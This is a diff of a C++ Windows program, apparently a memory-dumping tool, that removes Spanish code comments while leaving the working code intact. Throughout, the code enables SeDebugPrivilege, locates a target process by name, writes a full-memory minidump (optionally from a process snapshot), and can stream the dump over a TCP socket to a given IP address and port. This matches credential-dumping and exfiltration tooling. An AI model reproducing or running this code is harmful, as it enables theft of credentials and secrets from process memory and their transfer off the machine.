@@ -31,33 +31,29 @@
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Kernel32.lib")
 
-// Estructura de ayuda para pasar al callback
 struct CallbackHelper {
-    LPVOID dumpBuffer; // Buffer para almacenar el volcado
-    DWORD bytesRead;   // Cantidad de bytes leídos en el buffer
+    LPVOID dumpBuffer;
+    DWORD bytesRead;   
 };
 
-// Buffer para guardar el volcado
-LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75); // Ajusta el tamaño según sea necesario
+LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75); 
 DWORD bytesRead = 0;
 
 BOOL CALLBACK minidumpCallbackSocket(
     PVOID CallbackParam,
-    const PMINIDUMP_CALLBACK_INPUT CallbackInput, // Asegúrate de que la variable se llama CallbackInput
+    const PMINIDUMP_CALLBACK_INPUT CallbackInput, 
     PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
 ) {
     CallbackHelper* helper = (CallbackHelper*)CallbackParam;
 
-    switch (CallbackInput->CallbackType) { // Usa correctamente CallbackInput aquí
+    switch (CallbackInput->CallbackType) { 
     case IoStartCallback:
         CallbackOutput->Status = S_FALSE;
         break;
 
     case IoWriteAllCallback: {
         CallbackOutput->Status = S_OK;
-        // Asegúrate de usar CallbackInput, que es el nombre correcto del parámetro.
         LPVOID destination = (LPBYTE)helper->dumpBuffer + CallbackInput->Io.Offset;
-        // manejo de errores
         RtlCopyMemory(destination, CallbackInput->Io.Buffer, CallbackInput->Io.BufferBytes);
         DWORD newBytesRead = CallbackInput->Io.Offset + CallbackInput->Io.BufferBytes;
         if (newBytesRead > helper->bytesRead) {
@@ -71,21 +67,18 @@ BOOL CALLBACK minidumpCallbackSocket(
         break;
 
     }
-
-
     return TRUE;
 }
 
 BOOL CALLBACK minidumpCallbackSnap(
     PVOID CallbackParam,
-    const PMINIDUMP_CALLBACK_INPUT CallbackInput, // Asegúrate de que la variable se llama CallbackInput
+    const PMINIDUMP_CALLBACK_INPUT CallbackInput, 
     PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
 ) {
     CallbackHelper* helper = (CallbackHelper*)CallbackParam;
 
-    switch (CallbackInput->CallbackType) { // Usa correctamente CallbackInput aquí
+    switch (CallbackInput->CallbackType) { 
     case IsProcessSnapshotCallback:
-        // Informar a MiniDumpWriteDump que es una snapshot de proceso.
         CallbackOutput->Status = S_FALSE;
         break;
     }
@@ -94,7 +87,6 @@ BOOL CALLBACK minidumpCallbackSnap(
     return TRUE;
 }
 
-// Función para enviar el buffer a través de un socket
 BOOL SendDumpOverSocket(SOCKET socket, LPVOID buffer, DWORD bufferSize) {
     int iResult = send(socket, (const char*)buffer, bufferSize, 0);
     if (iResult == SOCKET_ERROR) {
@@ -113,14 +105,12 @@ SOCKET createSocket(const char* ipAddress, const char* port) {
     struct sockaddr_in clientService;
     int result;
 
-    // Inicializar Winsock
     result = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (result != 0) {
         printf("WSAStartup failed: %d\n", result);
         return INVALID_SOCKET;
     }
 
-    // Crear un socket
     ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (ConnectSocket == INVALID_SOCKET) {
         printf("Error at socket(): %ld\n", WSAGetLastError());
@@ -128,11 +118,9 @@ SOCKET createSocket(const char* ipAddress, const char* port) {
         return INVALID_SOCKET;
     }
 
-    // Configurar la dirección del servidor
     clientService.sin_family = AF_INET;
-    clientService.sin_port = htons(static_cast<u_short>(atoi(port))); // Convertir el puerto de cadena a entero
+    clientService.sin_port = htons(static_cast<u_short>(atoi(port))); 
 
-    // Usar InetPtonA para soportar la cadena de dirección IP ANSI
     if (InetPtonA(AF_INET, ipAddress, &clientService.sin_addr) <= 0) {
         printf("Invalid address/ Address not supported \n");
         closesocket(ConnectSocket);
@@ -140,7 +128,6 @@ SOCKET createSocket(const char* ipAddress, const char* port) {
         return INVALID_SOCKET;
     }
 
-    // Conectar al servidor
     result = connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
     if (result == SOCKET_ERROR) {
         closesocket(ConnectSocket);
@@ -154,7 +141,6 @@ SOCKET createSocket(const char* ipAddress, const char* port) {
 
 
 BOOL createMiniDumpSocket(DWORD processId, const char* ipAddress, const char* port) {
-    // Primero de todo, hay que obtener un puntero al proceso que queremos volcar
     HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
     if (!processHandle) {
         fprintf(stderr, "[!]OpenProcess(): Problema al obtener el handle al proceso. Tienes capacidad de SeDebugPrivilege? Codigo de error: %lu\n", GetLastError());
@@ -172,10 +158,8 @@ BOOL createMiniDumpSocket(DWORD processId, const char* ipAddress, const char* po
     }
     else {
         printf("Dumped %lu bytes\n", helper.bytesRead);
-        // Aquí conectas al servidor y envías el dump
         SOCKET serverSocket = createSocket(ipAddress, port);
         SendDumpOverSocket(serverSocket, helper.dumpBuffer, helper.bytesRead);
-        // No olvides cerrar el socket y realizar la limpieza necesaria
         closesocket(serverSocket);
         WSACleanup();
     }
@@ -199,7 +183,7 @@ BOOL createMiniDumpWrite(DWORD processId, const std::string& dumpFilePath, bool 
     if (snap) {
         DWORD flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
         DWORD status = PssCaptureSnapshot(processHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
-        if (status != ERROR_SUCCESS) { // Aquí comprobamos que status NO sea ERROR_SUCCESS para imprimir error.
+        if (status != ERROR_SUCCESS) { 
             fprintf(stderr, "[!]PssCaptureSnapshot(): Error al capturar snapshot. Codigo de error: %lu\n", status);
             CloseHandle(processHandle);
             return FALSE;
@@ -209,7 +193,6 @@ BOOL createMiniDumpWrite(DWORD processId, const std::string& dumpFilePath, bool 
         callbackInfo.CallbackParam = &helper;
     }
 
-    // Lo siguiente es crear un archivo en disco, que usaremos despues para el volcado
     HANDLE dumpFileHandle = CreateFileA(dumpFilePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (dumpFileHandle == INVALID_HANDLE_VALUE) {
         fprintf(stderr, "[!]CreateFileA(): Problema al obtener el handle. Tienes permisos de lectura en el lugar de volcado? El PID proporcionado existe? Codigo de error: %lu\n", GetLastError());
@@ -217,13 +200,11 @@ BOOL createMiniDumpWrite(DWORD processId, const std::string& dumpFilePath, bool 
         return FALSE;
     }
 
-    // Ya tenemos un archivo en disco, ahora vamos a rellenarlo con el contenido del puntero que hemos obtenido
     BOOL result = MiniDumpWriteDump(processHandle, processId, dumpFileHandle, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
     if (!result) {
         fprintf(stderr, "[!]MiniDumpWriteDump() Fallo al llamar a la funcion. Codigo de error: %lu\n", GetLastError());
     }
 
-    // Cerramos ambos handles (liberamos punteros :D)
     CloseHandle(dumpFileHandle);
     CloseHandle(processHandle);
 
@@ -235,25 +216,20 @@ BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege) {
     TOKEN_PRIVILEGES tokenPriv;
     LUID luid;
 
-    // Intentamos obtener el LUID
     if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
         fprintf(stderr, "[!]LookupPrivilegeValue(): error: %lu\n", GetLastError());
         return FALSE;
     }
 
-    // Seteamos los valores a la estructura TOKEN_PRIVIELGES
     tokenPriv.PrivilegeCount = 1;
     tokenPriv.Privileges[0].Luid = luid;
     tokenPriv.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;
 
-    // Le pasamos la nueva estrucutra tokenPriv con SeDebugPrivilege habilitado para que nos modifique el token del proceso
     if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
         fprintf(stderr, "[!]AdjustTokenPrivileges: error: %lu\n", GetLastError());
         return FALSE;
     }
 
-    // Que AdjustTokenPrivilege haya finalizado sin errores no quiere decir que se haya seteado el privielgio
-    // Si cumple esta condicion, lo más seguro es que se esté ejecutando desde un usuario que no tiene la capacidad de obtener ese priv
     if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
         printf("The token does not have SeDebugPrivielge. Maybe you're not admin? \n");
         return FALSE;
@@ -264,7 +240,7 @@ BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege) {
 
 
  std::string getProcessNameByPID(DWORD processID) {
-     char processName[MAX_PATH] = "<unknown>"; // Buffer para almacenar el nombre del proceso
+     char processName[MAX_PATH] = "<unknown>"; 
 
     // Abre un handle al proceso.
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
@@ -288,7 +264,7 @@ BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege) {
 DWORD getProcessId(const std::string& processName) {
     DWORD processIds[1024], processCount, processId = 0;
     if (!EnumProcesses(processIds, sizeof(processIds), &processCount)) {
-        return 0; // No se pudieron enumerar los procesos
+        return 0; 
     }
 
     processCount /= sizeof(DWORD);
@@ -296,11 +272,11 @@ DWORD getProcessId(const std::string& processName) {
     for (DWORD i = 0; i < processCount; i++) {
         if (processIds[i] != 0) {
             HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
-            if (hProcess) { // Verifica que OpenProcess haya tenido éxito
+            if (hProcess) { 
                 char processNameBuffer[MAX_PATH];
                 if (GetModuleBaseNameA(hProcess, NULL, processNameBuffer, sizeof(processNameBuffer) / sizeof(char)) > 0) {
-                    if (processName == processNameBuffer) { // Compara los nombres
-                        processId = processIds[i]; // Encontrado
+                    if (processName == processNameBuffer) { 
+                        processId = processIds[i]; 
                         CloseHandle(hProcess);
                         break;
                     }
